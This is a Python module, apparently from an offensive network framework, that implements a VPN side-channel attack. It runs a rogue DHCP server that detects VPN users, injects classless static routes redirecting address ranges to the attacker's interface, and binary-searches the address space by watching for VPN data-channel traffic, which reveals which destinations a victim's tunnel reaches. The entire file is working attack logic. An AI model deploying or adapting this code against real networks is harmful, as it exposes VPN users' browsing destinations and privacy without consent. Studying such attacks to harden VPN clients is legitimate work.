from arcane.dhcp.lease import DHCPLease
from arcane.dhcp.server import DHCPServer
from arcane.core.runtime import api, on_event
from arcane.core.threaded_worker import ThreadedWorker
from arcane.core.events import DHCPServerEvent, NetworkInterfaceEvent, VPNDetectorEvent, SocketEvent
from enum import Enum, auto
from scapy.all import DHCP, ARP
from queue import Queue
import ipaddress
import time

class NoRemainingItemsException(Exception):
    pass


class SidechannelState(Enum):
    STARTED = auto()
    WAITING_FOR_ACCEPT = auto()
    ANALYSIS = auto()
    FINISHED = auto()


class RouteSearchSpace(object):
    def __init__(self, space: str):
        self.space = ipaddress.IPv4Network(space) if type(space) is str else space
    
    def split(self):
        return [RouteSearchSpace(s) for s in self.space.subnets(1)]
    
    def __str__(self):
        return str(self.space)


    def invert(self):
        return [str(net) for net in ipaddress.IPv4Network('0.0.0.0/0').address_exclude(self.space)]



class ClientState(object):
    def __init__(self, searchspace, detector, sock, state: SidechannelState=SidechannelState.STARTED, desired_end_cidr: int=32):
        self.state            = state
        self.detector         = detector
        self.sock             = sock

        self.traffic_observed = False
        self.current_space    = searchspace
        self.space_queue      = Queue()
        self.desired_end_cidr = desired_end_cidr
        self.destinations     = []

        # Assume that it's sending something right off the bat
        self.handle_noblock()


    def is_complete(self):
        return self.space_queue.empty()


    def handle_noblock(self):
        # If there's still traffic, then put it in the list
        if self.current_space.space.prefixlen == self.desired_end_cidr:
            self.destinations.append(self.current_space)
        else:
            for space in self.current_space.split():
                self.space_queue.put(space)


    def next_space(self):
        if self.is_complete():
            raise NoRemainingItemsException
        else:
            next_space = self.space_queue.get()
            self.current_space = next_space
            return next_space



class Sidechanneler(ThreadedWorker):
    def __init__(self, server: DHCPServer, searchspace):
        self.server      = server
        self.clients     = {}
        self.searchspace = RouteSearchSpace(searchspace)
        self.results     = []
        super().__init__()


    @on_event(DHCPServerEvent.LEASE_ACCEPTED)
    def handle_lease_accepted(self, mac_address: str, lease: DHCPLease):
        if mac_address in self.clients:
            if self.clients[mac_address].state == SidechannelState.STARTED:
                self.inject_routes(mac_address, lease, do_after=self.server.options['lease_time'])

            # Lease has been accepted! Move to analysis
            elif self.clients[mac_address].state == SidechannelState.WAITING_FOR_ACCEPT:
                self.log.info(f"Analysis running for {mac_address} in {self.clients[mac_address].current_space}")
                self.clients[mac_address].state = SidechannelState.ANALYSIS
                self.analyze_traffic(mac_address, lease, do_after=self.server.options['lease_time']-3)
        

    @on_event(VPNDetectorEvent.VPN_FOUND)
    def register_vpn_user(self, sock, detector):
        mac_address = self.server.interface.arp_table[sock.ip_address]

        # Client not registered, start the FSM
        if not mac_address in self.clients:
            self.log.info(f"Registering new client {mac_address}")
            self.clients[mac_address] = ClientState(self.searchspace, detector, sock)



    @on_event(SocketEvent.READ)
    @api
    def listen_for_traffic(self, _sock_man, _iface, proto, src, _dst, payload):
        for client in self.clients.values():
            if client.state == SidechannelState.ANALYSIS and client.sock.matches_event((_sock_man, _iface, proto, src, _dst, payload)):
                client.traffic_observed |= client.detector.is_datachannel_packet(payload)


    @api
    def inject_routes(self, mac_address: str, lease: DHCPLease):
        try:
            next_space = self.clients[mac_address].next_space()
            self.log.info(f"Testing space {next_space} for {mac_address}")
            lease.options.update({'classless_static_routes': [f"{net}:{self.server.interface.ip_address}" for net in next_space.invert()]})

            self.clients[mac_address].state = SidechannelState.WAITING_FOR_ACCEPT
            self.clients[mac_address].traffic_observed = False

        except NoRemainingItemsException:
            self.log.error(f"Client {mac_address} has no remaining spaces to test")
            self.clients[mac_address].state = SidechannelState.FINISHED
            self.results.append((mac_address, time.time(), self.clients[mac_address]))

            del self.clients[mac_address]


    @api
    def analyze_traffic(self, mac_address: str, lease: DHCPLease):
        # There's still traffic; do more blocking
        if self.clients[mac_address].traffic_observed:
            self.log.info(f"{mac_address} traffic is in {self.clients[mac_address].current_space}")
            self.clients[mac_address].handle_noblock()

        self.inject_routes(mac_address, lease)
